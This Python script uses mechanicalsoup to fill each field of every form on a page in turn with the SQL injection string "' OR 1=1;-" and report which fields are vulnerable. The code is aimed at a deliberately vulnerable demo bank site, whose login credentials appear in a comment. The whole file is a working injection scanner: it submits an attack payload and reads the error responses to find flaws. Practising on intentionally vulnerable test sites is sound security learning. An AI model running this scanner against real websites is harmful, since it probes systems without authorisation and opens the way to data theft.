import mechanicalsoup

"""try SQLi on form fields and deduce which fields are vulnerable to SQLi
"""

# To test this you'll need a vulnerable webapp
# https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project#tab=On-Line_apps

# I initially chose OWASP Webgoat, but mechsoup was having issues w/ the JS
# I recommend using: http://demo.testfire.net/ creds=jsmith/Demo1234

attack_string = "' OR 1=1;-"
safe_string = "asdf"
vuln_text = "Characters found after end of SQL statement."
# the user agent part isn't necessary, I just wanted to show how to modify the underlying 'requests' config
br = mechanicalsoup.Browser(soup_config={'features': 'lxml'}, requests_adapters={'headers':"{'User-agent': 'Mozilla/5.0'}"})

#login_page = br.get("http://demo.testfire.net/bank/login.aspx")
login_page = br.get("http://demo.testfire.net/feedback.aspx")

forms = login_page.soup.find_all('form')

# Iterate through each form
# Then iterate through each field on that form
# Test for SQLi
# Move onto next field in that form, then next form

for form_num, form in enumerate(forms):
	# attempts to remove fields that can't accept values like: submit/reset
	inputs = []
	for each in form.findChildren('input'):
		if each.has_attr('type'):
			if each['type'] in ['text', 'hidden']:
				inputs.append(each)
		else:
			inputs.append(each)

	# uses a nested loop to test each form field individually
	# while still submitting safe values for the other fields in the same form
		
	for i in range(len(inputs)):
		for j in range(len(inputs)):

			form.select('input')[j]['value'] = safe_string
			
			# try single field per iteration for SQLi
			if i == j:
				form.select('input')[j]['value'] = attack_string


		page2 = br.submit(form, login_page.url)
		# I would have used form['id'] but not all forms on this site use 'id'
		if vuln_text in page2.text:
			print("Parameter {} in form #{} is vulnerable to SQLi!".format(form.select('input')[i], form_num))
		else:
			print("Parameter {} in form #{} is not vulnerable to SQLi!".format(form.select('input')[i], form_num))
